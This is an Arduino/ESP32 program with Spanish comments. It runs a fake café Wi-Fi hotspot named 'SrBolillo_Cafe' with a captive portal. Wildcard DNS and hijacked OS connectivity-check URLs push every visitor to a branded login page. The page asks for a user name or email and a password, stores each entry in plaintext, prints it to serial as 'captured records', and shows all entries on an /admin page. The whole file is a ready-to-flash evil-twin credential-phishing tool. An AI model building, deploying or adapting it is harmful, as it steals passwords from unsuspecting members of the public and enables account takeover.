#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

DNSServer dnsServer;
WebServer server(80);

// ─── Estructura de registros ──────────────────────────────────────────────────
struct Registro {
  String usuario;
  String password;
  String hora;
};

Registro registros[20];
int totalRegistros = 0;
unsigned long tiempoInicio;

// ─── Página de login ──────────────────────────────────────────────────────────
const char LOGIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SrBolillo Café | WiFi</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-color: #1C0A00;
      background-image:
        radial-gradient(ellipse at top,    #3B1504 0%, transparent 60%),
        radial-gradient(ellipse at bottom, #0D0400 0%, transparent 70%);
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 15% 20%, rgba(210,140,40,0.07) 0%, transparent 50%),
        radial-gradient(circle at 85% 80%, rgba(180,90,10,0.08) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    .wrapper {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
    }

    /* ── Header ── */
    .header {
      text-align: center;
      margin-bottom: 18px;
      animation: fadeDown 0.55s ease both;
    }

    .logo-ring {
      width: 82px;
      height: 82px;
      border-radius: 50%;
      background: linear-gradient(145deg, #C87941, #7B3F10);
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 14px;
      box-shadow:
        0 6px 28px rgba(150,70,10,0.55),
        0 0 0 3px rgba(200,121,65,0.25),
        0 0 0 6px rgba(200,121,65,0.08);
      font-size: 40px;
      line-height: 1;
    }

    .brand {
      font-size: 27px;
      font-weight: 900;
      color: #F5E6C8;
      letter-spacing: -0.5px;
      text-shadow: 0 2px 10px rgba(0,0,0,0.40);
    }

    .brand em {
      color: #C87941;
      font-style: normal;
    }

    .tagline {
      font-size: 10px;
      color: rgba(245,230,200,0.45);
      letter-spacing: 0.18em;
      text-transform: uppercase;
      font-weight: 600;
      margin-top: 5px;
    }

    /* ── Badge WiFi ── */
    .wifi-badge {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      background: rgba(200,121,65,0.12);
      border: 0.5px solid rgba(200,121,65,0.28);
      border-radius: 20px;
      padding: 5px 16px;
      margin-bottom: 18px;
      animation: fadeDown 0.55s ease 0.05s both;
    }

    .wifi-dot {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #4ade80;
      box-shadow: 0 0 6px #4ade80;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50%       { opacity: 0.35; }
    }

    .wifi-badge span {
      font-size: 11px;
      color: rgba(245,230,200,0.70);
      letter-spacing: 0.03em;
    }

    /* ── Tarjeta ── */
    .card {
      background: #FFF8F0;
      border-radius: 22px;
      padding: 28px 24px 22px;
      width: 100%;
      max-width: 355px;
      box-shadow:
        0 16px 48px rgba(0,0,0,0.45),
        0 2px 8px rgba(0,0,0,0.20);
      animation: fadeUp 0.55s ease 0.10s both;
      border-top: 4px solid #C87941;
      position: relative;
      overflow: hidden;
    }

    .card::before {
      content: '';
      position: absolute;
      top: -30px; right: -30px;
      width: 100px; height: 100px;
      border-radius: 50%;
      background: radial-gradient(circle, rgba(200,121,65,0.10), transparent);
    }

    .card-title {
      font-size: 16px;
      font-weight: 800;
      color: #2C0F00;
      text-align: center;
      margin-bottom: 4px;
    }

    .card-sub {
      font-size: 12px;
      color: #A07850;
      text-align: center;
      margin-bottom: 22px;
      line-height: 1.55;
    }

    .field { margin-bottom: 14px; }

    .field label {
      display: block;
      font-size: 10px;
      font-weight: 800;
      color: #7B4010;
      letter-spacing: 0.09em;
      text-transform: uppercase;
      margin-bottom: 5px;
    }

    .field input {
      width: 100%;
      padding: 11px 14px;
      border: 1.5px solid #E8D0B0;
      border-radius: 10px;
      font-size: 14px;
      background: #FFFAF4;
      color: #2C0F00;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
    }

    .field input:focus {
      border-color: #C87941;
      background: #fff;
      box-shadow: 0 0 0 3px rgba(200,121,65,0.18);
    }

    .field input::placeholder { color: #C8A880; }

    .btn {
      width: 100%;
      padding: 13px;
      background: linear-gradient(135deg, #C87941 0%, #8B4010 100%);
      color: #FFF8F0;
      border: none;
      border-radius: 11px;
      font-size: 15px;
      font-weight: 800;
      cursor: pointer;
      letter-spacing: 0.04em;
      margin-top: 6px;
      transition: opacity 0.2s, transform 0.12s, box-shadow 0.2s;
      box-shadow: 0 4px 18px rgba(139,64,16,0.45);
      text-shadow: 0 1px 3px rgba(0,0,0,0.25);
    }

    .btn:hover  { opacity: 0.90; box-shadow: 0 4px 22px rgba(139,64,16,0.60); }
    .btn:active { transform: scale(0.97); }

    /* ── Divisor ── */
    .divider {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 18px 0 13px;
    }

    .divider hr  { flex: 1; border: none; border-top: 0.5px solid #E8D0B0; }
    .divider span { font-size: 10px; color: #C8A880; letter-spacing: 0.05em; white-space: nowrap; }

    .info-strip {
      background: #FFF3E0;
      border-radius: 9px;
      padding: 9px 14px;
      text-align: center;
      font-size: 11px;
      color: #8B5020;
      line-height: 1.55;
      border: 0.5px solid #F0C888;
    }

    /* ── Footer ── */
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 10px;
      color: rgba(245,230,200,0.28);
      line-height: 1.9;
      animation: fadeUp 0.55s ease 0.2s both;
    }

    @keyframes fadeDown {
      from { opacity: 0; transform: translateY(-14px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(14px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
<div class="wrapper">

  <div class="header">
    <div class="logo-ring">&#9749;</div>
    <div class="brand">Sr<em>Bolillo</em> Caf&eacute;</div>
    <div class="tagline">Caf&eacute; &bull; Pan &bull; Antojitos</div>
  </div>

  <div class="wifi-badge">
    <div class="wifi-dot"></div>
    <span>SrBolillo_Cafe disponible</span>
  </div>

  <div class="card">
    <div class="card-title">&#128247; Acceso al WiFi</div>
    <div class="card-sub">
      Ingresa tus datos para conectarte<br>y disfrutar navegando.
    </div>

    <form action="/login" method="POST">
      <div class="field">
        <label>Usuario</label>
        <input type="text" name="usuario"
               placeholder="Tu nombre o correo" required
               autocomplete="username">
      </div>

      <div class="field">
        <label>Contrase&ntilde;a</label>
        <input type="password" name="password"
               placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required
               autocomplete="current-password">
      </div>

      <button class="btn" type="submit">Conectarse &rarr;</button>
    </form>

    <div class="divider">
      <hr><span>Oferta del d&iacute;a</span><hr>
    </div>

    <div class="info-strip">
      &#9749; Caf&eacute; Americano + Bolillo con mantequilla<br>
      <strong>solo $30</strong> &mdash; v&aacute;lido hasta agotar existencias
    </div>
  </div>

  <div class="footer">
    SrBolillo Caf&eacute; &copy; 2025 &bull; Canc&uacute;n, Q.Roo<br>
    El sabor de siempre, en cada mordida
  </div>

</div>
</body>
</html>
)rawliteral";

// ─── Página de conexión exitosa ───────────────────────────────────────────────
const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SrBolillo Café | Conectado</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-color: #1C0A00;
      background-image:
        radial-gradient(ellipse at top,    #3B1504 0%, transparent 60%),
        radial-gradient(ellipse at bottom, #0D0400 0%, transparent 70%);
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 15% 20%, rgba(210,140,40,0.07) 0%, transparent 50%),
        radial-gradient(circle at 85% 80%, rgba(180,90,10,0.08) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    .wrapper {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
    }

    .top-label {
      font-size: 11px;
      color: rgba(245,230,200,0.40);
      letter-spacing: 0.16em;
      text-transform: uppercase;
      font-weight: 700;
      margin-bottom: 22px;
      animation: fadeDown 0.5s ease both;
    }

    .check-circle {
      width: 88px;
      height: 88px;
      border-radius: 50%;
      background: linear-gradient(135deg, #C87941, #7B3F10);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      font-size: 42px;
      box-shadow:
        0 6px 30px rgba(139,64,16,0.55),
        0 0 0 6px rgba(200,121,65,0.15),
        0 0 0 12px rgba(200,121,65,0.06);
      animation: popIn 0.55s cubic-bezier(0.34,1.56,0.64,1) both;
    }

    .title {
      font-size: 26px;
      font-weight: 900;
      color: #F5E6C8;
      text-align: center;
      margin-bottom: 6px;
      text-shadow: 0 2px 8px rgba(0,0,0,0.30);
      animation: fadeUp 0.5s ease 0.1s both;
    }

    .subtitle {
      font-size: 13px;
      color: rgba(245,230,200,0.50);
      text-align: center;
      line-height: 1.65;
      margin-bottom: 26px;
      animation: fadeUp 0.5s ease 0.15s both;
    }

    .info-card {
      background: rgba(255,248,240,0.06);
      border: 0.5px solid rgba(200,121,65,0.22);
      border-radius: 16px;
      width: 100%;
      max-width: 340px;
      overflow: hidden;
      animation: fadeUp 0.5s ease 0.2s both;
    }

    .info-row {
      padding: 13px 18px;
      border-bottom: 0.5px solid rgba(200,121,65,0.10);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .info-row:last-child { border-bottom: none; }

    .info-label {
      font-size: 10px;
      color: #C87941;
      letter-spacing: 0.09em;
      text-transform: uppercase;
      font-weight: 700;
    }

    .info-value {
      font-size: 13px;
      color: #F5E6C8;
      font-weight: 600;
    }

    .info-value.ok { color: #4ade80; }

    .promo-card {
      background: linear-gradient(135deg, #C87941, #7B3F10);
      border-radius: 14px;
      padding: 14px 20px;
      width: 100%;
      max-width: 340px;
      margin-top: 14px;
      text-align: center;
      animation: fadeUp 0.5s ease 0.28s both;
      box-shadow: 0 4px 20px rgba(139,64,16,0.40);
    }

    .promo-card p { font-size: 11px; color: rgba(255,248,240,0.80); font-weight: 600; }
    .promo-card strong { display: block; font-size: 15px; color: #FFF8F0; margin-top: 3px; text-shadow: 0 1px 4px rgba(0,0,0,0.20); }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 10px;
      color: rgba(245,230,200,0.25);
      line-height: 1.9;
      animation: fadeUp 0.5s ease 0.32s both;
    }

    @keyframes fadeDown { from { opacity: 0; transform: translateY(-12px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeUp   { from { opacity: 0; transform: translateY(14px);  } to { opacity: 1; transform: translateY(0); } }
    @keyframes popIn    { from { transform: scale(0.3); opacity: 0; }        to { transform: scale(1);   opacity: 1; } }
  </style>
</head>
<body>
<div class="wrapper">

  <div class="top-label">&#9749; SrBolillo Caf&eacute;</div>

  <div class="check-circle">&#x2713;</div>

  <div class="title">&#161;Ya est&aacute;s dentro!</div>
  <div class="subtitle">Bienvenido al WiFi de SrBolillo Caf&eacute;.<br>Navega y disfruta tu pedido.</div>

  <div class="info-card">
    <div class="info-row">
      <span class="info-label">Red</span>
      <span class="info-value">SrBolillo_Cafe</span>
    </div>
    <div class="info-row">
      <span class="info-label">Estado</span>
      <span class="info-value ok">Conectado &#x2713;</span>
    </div>
    <div class="info-row">
      <span class="info-label">Servidor</span>
      <span class="info-value">192.168.4.1</span>
    </div>
    <div class="info-row">
      <span class="info-label">Acceso</span>
      <span class="info-value">Clientes SrBolillo</span>
    </div>
  </div>

  <div class="promo-card">
    <p>&#9749; Promoci&oacute;n del d&iacute;a</p>
    <strong>Caf&eacute; Americano + Bolillo por $30</strong>
  </div>

  <div class="footer">
    SrBolillo Caf&eacute; &copy; 2025 &bull; Canc&uacute;n, Q.Roo<br>
    El sabor de siempre, en cada mordida
  </div>

</div>
</body>
</html>
)rawliteral";

// ─── Panel de administración ──────────────────────────────────────────────────
void handleAdmin() {
  String html = F("<!DOCTYPE html>"
    "<html lang='es'><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<title>SrBolillo Cafe | Admin</title>"
    "<style>"
    "*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }"
    "body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #1C0A00; min-height: 100vh; padding: 24px 16px; }"
    ".header { text-align: center; margin-bottom: 24px; }"
    ".header h2 { font-size: 20px; font-weight: 800; color: #F5E6C8; margin-bottom: 4px; }"
    ".header p { font-size: 11px; color: #C87941; letter-spacing: 0.08em; text-transform: uppercase; }"
    ".badge-total { display: inline-block; background: linear-gradient(135deg,#C87941,#7B3F10); color: #FFF8F0; font-size: 12px; font-weight: 700; padding: 4px 14px; border-radius: 20px; margin-top: 10px; box-shadow: 0 2px 10px rgba(139,64,16,0.40); }"
    ".table-wrap { background: #FFF8F0; border-radius: 16px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.35); max-width: 700px; margin: 0 auto; }"
    "table { width: 100%; border-collapse: collapse; }"
    "thead tr { background: linear-gradient(135deg, #3B1504, #1C0A00); }"
    "th { padding: 13px 16px; font-size: 10.5px; font-weight: 700; color: #C87941; letter-spacing: 0.08em; text-transform: uppercase; text-align: left; }"
    "td { padding: 11px 16px; font-size: 13px; color: #3B1504; border-bottom: 0.5px solid #F0D8B8; }"
    "tr:last-child td { border-bottom: none; }"
    "tr:hover td { background: #FFF3E0; }"
    ".num { background: #7B3F10; color: #FFF8F0; padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: 700; }"
    ".usr { color: #7B3F10; font-weight: 700; }"
    ".pass { font-family: monospace; background: #FFF3E0; padding: 2px 8px; border-radius: 5px; color: #8B5020; font-size: 12px; }"
    ".time { color: #A07850; font-size: 12px; }"
    ".empty { text-align: center; padding: 40px 20px; color: #C8A880; font-size: 14px; }"
    ".footer { margin-top: 20px; text-align: center; font-size: 10px; color: rgba(245,230,200,0.28); line-height: 1.8; }"
    "</style></head><body>"
    "<div class='header'>"
    "<h2>&#128274; Panel de Registros</h2>"
    "<p>SrBolillo_Cafe &bull; Monitor de accesos</p>");

  html += "<span class='badge-total'>Total: ";
  html += String(totalRegistros);
  html += " registro(s)</span></div>";

  html += F("<div class='table-wrap'>");

  if (totalRegistros == 0) {
    html += F("<p class='empty'>A&uacute;n no hay registros capturados.</p>");
  } else {
    html += F("<table><thead><tr>"
      "<th>#</th>"
      "<th>Usuario</th>"
      "<th>Contrase&ntilde;a</th>"
      "<th>Tiempo (seg)</th>"
      "</tr></thead><tbody>");

    for (int i = 0; i < totalRegistros; i++) {
      html += "<tr>";
      html += "<td><span class='num'>" + String(i + 1) + "</span></td>";
      html += "<td class='usr'>" + registros[i].usuario + "</td>";
      html += "<td><span class='pass'>" + registros[i].password + "</span></td>";
      html += "<td class='time'>" + registros[i].hora + "s</td>";
      html += "</tr>";
    }

    html += F("</tbody></table>");
  }

  html += F("</div>"
    "<div class='footer'>"
    "SrBolillo Caf&eacute; &copy; 2025 &bull; Canc&uacute;n, Q.Roo"
    "</div>"
    "</body></html>");

  server.send(200, "text/html; charset=UTF-8", html);
}

// ─── Imprimir tabla de registros en Monitor Serie ────────────────────────────
void imprimirRegistros() {
  Serial.println();
  Serial.println("╔══════════════════════════════════════════════╗");
  Serial.printf( "║   REGISTROS CAPTURADOS — Total: %-3d          ║\n", totalRegistros);
  Serial.println("╠═══╦══════════════════════╦═══════════╦═══════╣");
  Serial.println("║ # ║ Usuario              ║ Contrasena║ Tiempo║");
  Serial.println("╠═══╬══════════════════════╬═══════════╬═══════╣");

  if (totalRegistros == 0) {
    Serial.println("║         Aun no hay registros capturados       ║");
  } else {
    for (int i = 0; i < totalRegistros; i++) {
      String usr  = registros[i].usuario;
      String pass = registros[i].password;
      String hora = registros[i].hora + "s";

      // Recortar si es muy largo para que la tabla quede alineada
      if (usr.length()  > 20) usr  = usr.substring(0, 19) + ".";
      if (pass.length() >  9) pass = pass.substring(0, 8) + ".";

      Serial.printf("║ %-2d║ %-20s ║ %-9s ║ %-5s ║\n",
                    i + 1,
                    usr.c_str(),
                    pass.c_str(),
                    hora.c_str());
    }
  }

  Serial.println("╚═══╩══════════════════════╩═══════════╩═══════╝");
  Serial.println();
}

// ─── Manejador principal ──────────────────────────────────────────────────────
void handlePortal() {
  if (server.method() == HTTP_POST) {
    String usuario  = server.arg("usuario");
    String password = server.arg("password");

    unsigned long segs = (millis() - tiempoInicio) / 1000;

    if (totalRegistros < 20) {
      registros[totalRegistros].usuario  = usuario;
      registros[totalRegistros].password = password;
      registros[totalRegistros].hora     = String(segs);
      totalRegistros++;
    }

    Serial.println("\n  >> NUEVO REGISTRO CAPTURADO <<");
    Serial.println("  Usuario    : " + usuario);
    Serial.println("  Contrasena : " + password);
    Serial.println("  Tiempo     : " + String(segs) + "s");

    // Mostrar tabla completa actualizada
    imprimirRegistros();

    server.send(200, "text/html; charset=UTF-8", SUCCESS_HTML);
    return;
  }

  server.send(200, "text/html; charset=UTF-8", LOGIN_HTML);
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(500);
  tiempoInicio = millis();

  Serial.println("\n==============================");
  Serial.println("  SrBolillo Cafe WiFi Portal");
  Serial.println("==============================");

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("SrBolillo_Cafe");

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/",                          handlePortal);
  server.on("/login",                     handlePortal);
  server.on("/generate_204",              handlePortal);
  server.on("/gen_204",                   handlePortal);
  server.on("/hotspot-detect.html",       handlePortal);
  server.on("/library/test/success.html", handlePortal);
  server.on("/ncsi.txt",                  handlePortal);
  server.on("/connecttest.txt",           handlePortal);
  server.on("/redirect",                  handlePortal);
  server.on("/admin",                     handleAdmin);

  server.onNotFound(handlePortal);
  server.begin();

  Serial.println("  Red    : SrBolillo_Cafe");
  Serial.println("  IP     : 192.168.4.1");
  Serial.println("  Admin  : 192.168.4.1/admin");
  Serial.println("  Estado : LISTO");
  Serial.println("==============================\n");
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Imprimir tabla cada 30 segundos (solo si hay registros)
  static unsigned long ultimoReporte = 0;
  if (millis() - ultimoReporte >= 30000) {
    ultimoReporte = millis();
    if (totalRegistros > 0) imprimirRegistros();
  }
}
